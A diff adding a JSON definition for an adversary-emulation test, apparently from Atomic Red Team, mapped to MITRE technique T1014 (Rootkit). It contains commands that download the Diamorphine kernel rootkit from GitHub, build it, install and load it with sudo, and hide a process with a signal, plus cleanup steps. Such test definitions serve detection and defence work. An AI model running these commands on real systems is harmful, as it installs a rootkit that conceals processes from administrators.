@@ -1,0 +1,48 @@
+{
+    "name": "Loadable Kernel Module based Rootkit (Diamorphine)",
+    "description": "Loads Diamorphine kernel module, which hides itself and a processes. ",
+    "supported_platforms": [
+        "linux"
+    ],
+    "dependency_executor_name": "bash",
+    "executor": {
+        "command": "sudo modprobe #{rootkit_name}\nping -c 10 localhost >/dev/null & TARGETPID=\"$!\"\nps $TARGETPID\nkill -31 $TARGETPID\nps $TARGETPID || echo \"process ${TARGETPID} hidden\"\n",
+        "cleanup_command": "kill -63 1\nsudo modprobe -r #{rootkit_name}\nsudo rm -rf /lib/modules/$(uname -r)/#{rootkit_name}.ko /tmp/atomic\nsudo depmod -a\n",
+        "name": "sh",
+        "elevation_required": true,
+        "type": "Command Executor"
+    },
+    "id": "T1014",
+    "tactics": [
+        "Defense Evasion"
+    ],
+    "technique": "Rootkit",
+    "source": "ART",
+    "uuid": "0b996469-48c6-46e2-8155-a17f8b6c2247",
+    "arguments": {
+        "repo": {
+            "description": "Url of the diamorphine github repo",
+            "type": "string",
+            "default": "https://github.com/m0nad/Diamorphine/"
+        },
+        "rev": {
+            "description": "Revision of the github repo zip",
+            "type": "string",
+            "default": "898810523aa2033f582a4a5903ffe453334044f9"
+        },
+        "rootkit_name": {
+            "description": "Module name",
+            "type": "string",
+            "default": "diamorphine"
+        }
+    },
+    "preconditions": [
+        {
+            "description": "The kernel module must exist on disk at specified location (#{rootkit_name}.ko)\n",
+            "prereq_command": "if [ -f /lib/modules/$(uname -r)/#{rootkit_name}.ko ]; then exit 0; else exit 1; fi;\n",
+            "get_prereq_command": "mkdir -p /tmp/atomic && cd /tmp/atomic\ncurl -sLO #{repo}/archive/#{rev}.zip && unzip #{rev}.zip && cd Diamorphine-#{rev}\nmake\nsudo cp #{rootkit_name}.ko /lib/modules/$(uname -r)/\nsudo depmod -a\n"
+        }
+    ],
+    "infrastructure_requirement": [],
+    "side": "Victim"
+}
